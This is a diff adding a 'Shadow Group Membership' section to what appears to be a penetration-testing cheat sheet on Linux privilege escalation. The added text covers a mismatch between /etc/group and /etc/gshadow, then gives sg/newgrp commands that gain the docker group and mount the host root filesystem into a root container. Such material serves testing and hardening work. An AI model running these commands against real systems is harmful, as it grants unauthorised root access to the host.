@@ -717,6 +717,35 @@ $ lxc start ignite
 $ lxc exec ignite /bin/sh
 ```
 
+## Shadow Group Membership
+
+### Prerequisites
+
+- A configuration mismatch between `/etc/group` and `/etc/gshadow`
+- User is listed in `/etc/gshadow` but not in `/etc/group`
+- Target group has no password or the attacker knows it
+
+### Verification
+
+```console
+docker:!::alice,bob
+# or
+docker:::alice,bob
+```
+
+### Execution
+
+```console
+$ newgrp <GROUP>
+$ sg docker -c "id"
+```
+
+or
+
+```console
+$ sg docker -c "docker run --rm -v /:/hostfs --user root --entrypoint ls <IMAGE> /hostfs/"
+```
+
 ## Telnet Shell
 
 Getting a proper reverse shell inside a container, when sh, bash, netcat or python is missing.
